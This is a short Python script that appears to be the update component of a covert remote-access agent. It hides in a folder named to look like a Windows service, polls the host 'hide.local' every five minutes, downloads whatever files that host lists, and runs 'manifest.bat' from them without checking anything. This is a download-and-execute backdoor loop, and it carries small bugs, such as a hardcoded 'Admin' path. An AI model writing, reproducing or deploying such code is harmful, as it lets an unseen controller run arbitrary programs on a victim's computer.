import urllib.request as req
import json
import os
import subprocess
import time

class Timer:
	def SetTimer(self, mins):
		self.mins = mins
		
	def StartTimer(self):
		while self.mins:
			time.sleep(60)
			self.mins -= 1
			
		return self.callback()
		
	def SetCallback(self, callback):
		self.callback = callback
	
	def Restart(self, mins):
		self.mins = mins
		self.StartTimer		
		
def checkForUpdates():
	username = os.getlogin()
	path = 'C:\\Users\\{0}\\Documents\\WindowsService\\WindowsExceptDevice\\'.format(username)
	update_path = path + 'update\\'
	update_files = json.loads(req.urlopen('http://hide.local/?get=update').read().decode('utf-8'))[2:]
	
	if update_files == []: return False
	
	for file in update_files:
		req.urlretrieve('http://hide.local/update/{0}'.format(file), update_path + file)
	
	os.chdir(r'C:\Users\Admin\Documents\WindowsService\WindowsExceptDevice\update')
	subprocess.call('manifest.bat')
	
while True:
	timer = Timer()
	timer.SetTimer(5)
	timer.SetCallback(checkForUpdates)
	timer.StartTimer()